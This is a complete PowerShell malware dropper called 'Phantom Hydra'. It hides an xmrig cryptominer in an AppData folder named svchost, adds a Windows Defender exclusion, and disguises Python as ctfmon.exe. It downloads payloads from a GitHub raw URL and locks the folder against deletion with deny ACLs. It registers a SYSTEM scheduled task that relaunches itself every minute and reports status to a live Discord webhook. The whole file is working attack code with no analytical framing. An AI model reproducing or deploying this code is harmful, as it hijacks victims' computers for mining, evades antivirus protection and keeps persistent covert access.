# --- THE GHOST MASTER (VERSION 6.2 - PHANTOM HYDRA) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# --- STEP 0: THE GHOST CHECK (Idempotency) ---
if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) {
    exit
}

if (Test-Path $PY_MASK) {
    $env:PYTHONPATH = "$Path\python\Lib\site-packages"
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Re-Engaged from Disk on $($env:COMPUTERNAME)"
    exit
}

# --- IF WE ARE HERE, WE NEED A FULL LANDING ---
Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Clear & Exclusion (THE LOCK-BREAKER)
if (Test-Path $Path) { 
    try {
        $Acl = Get-Acl $Path
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
        $Acl.RemoveAccessRule($Ar)
        Set-Acl $Path $Acl
    } catch {}

    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}

New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Python Core Landing
Send-Ghost "Downloading Lungs (60MB)..."
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# 3. THE "LUNGS" FIX
Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Remove-Item -Force
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location

# 4. Payload Landing & ACL LOCK
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.bin"

if (Test-Path "$Path\mui_cache.bin") {
    Rename-Item -Path "$Path\mui_cache.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    
    # --- THE LOCK THE DOOR (ACL) ---
    try {
        $Acl = Get-Acl $Path
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
        $Acl.AddAccessRule($Ar)
        Set-Acl $Path $Acl
        Send-Ghost "Folder Locked (ACL Deny)."
    } catch {}
}

# 5. ACTIVATION & RESURRECTION TASK (THE "OLD SCHOOL" HYDRA)
if (Test-Path "$Path\python\pythonw.exe") {
    Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
    
    # Register the Resurrection Task as SYSTEM for maximum power
    # This runs every 1 minute and is 100% silent
    $TaskCommand = "schtasks /create /tn `"WindowsUpdateManager`" /tr `"$PY_MASK `"$Path\WinServices.py`" --id $ID`" /sc minute /mo 1 /ru `"SYSTEM`" /f"
    Invoke-Expression $TaskCommand

    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Released. Resurrection Task Active (Old School Mode)."
}

# CLEANUP
Remove-Item -Path "$Path\get-pip.py", "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
